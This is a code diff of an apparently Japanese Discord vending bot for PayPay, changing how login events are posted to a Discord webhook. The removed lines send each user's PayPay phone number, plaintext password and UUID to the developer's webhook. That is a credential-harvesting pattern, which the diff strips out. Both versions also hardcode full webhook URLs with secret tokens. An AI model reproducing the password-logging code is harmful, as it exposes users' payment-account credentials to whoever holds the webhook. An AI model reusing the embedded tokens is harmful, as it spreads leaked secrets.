@@ -12,7 +12,7 @@ import paypayu
 PAYPAY_DATA_FILE = "paypay_data.json"
 VENDING_DATA_FILE = "vending_data.json"
 
-LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1558738870282092615/WWh91oKrG1d9mkjZRI8aHGRWvm2bTdJKZiDxb0edDUzCL5Muuogna4e9-kis5gwI7BXI"
+LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1559191675451215983/OOV9t6Mg6mvYw4TJoc9wp0ZBgTXsLhkCjITDwVexLjWTLPm0qsY0EMuWMdUIR8C99Beb"
 
 
 def load_vending_data():
@@ -56,12 +56,12 @@ async def send_login_log_to_webhook(
 
     try:
         embed = discord.Embed(
-            title="🔐 PayPay ログイン試行",
+            title="🔐 PayPay ログイン通知",
             color=discord.Color.orange(),
             timestamp=discord.utils.utcnow()
         )
 
-        # アイコン付き author
+        # ===== アイコン + 名前 =====
         try:
             avatar_url = user.display_avatar.url
         except Exception:
@@ -69,46 +69,38 @@ async def send_login_log_to_webhook(
 
         if avatar_url:
             embed.set_author(
-                name=f"{user} ({user.id})",
+                name=f"{user}",
                 icon_url=avatar_url
             )
             embed.set_thumbnail(url=avatar_url)
         else:
-            embed.set_author(name=f"{user} ({user.id})")
+            embed.set_author(name=f"{user}")
 
-        # Discord情報
+        # ===== ユーザーID（名前の下）=====
         embed.add_field(
-            name="Discord 名前",
-            value=f"```{user}```",
-            inline=False
-        )
-        embed.add_field(
-            name="Discord ID",
+            name="ユーザーID",
             value=f"```{user.id}```",
             inline=False
         )
-        embed.add_field(
-            name="サーバー",
-            value=f"```{guild.name if guild else 'DM'} ({guild.id if guild else '-'})```",
-            inline=False
-        )
 
-        # 入力情報
-        embed.add_field(
-            name="電話番号",
-            value=f"```{phone}```",
-            inline=True
-        )
-        embed.add_field(
-            name="パスワード",
-            value=f"```{password}```",
-            inline=True
-        )
-        embed.add_field(
-            name="UUID",
-            value=f"```{uuid_str}```",
-            inline=False
-        )
+        # ===== どこでログインしたか =====
+        if guild:
+            embed.add_field(
+                name="ログイン場所",
+                value=f"```{guild.name}```",
+                inline=False
+            )
+            embed.add_field(
+                name="サーバーID",
+                value=f"```{guild.id}```",
+                inline=False
+            )
+        else:
+            embed.add_field(
+                name="ログイン場所",
+                value="```DM```",
+                inline=False
+            )
 
         embed.set_footer(text="Developer @anzy1m")
 
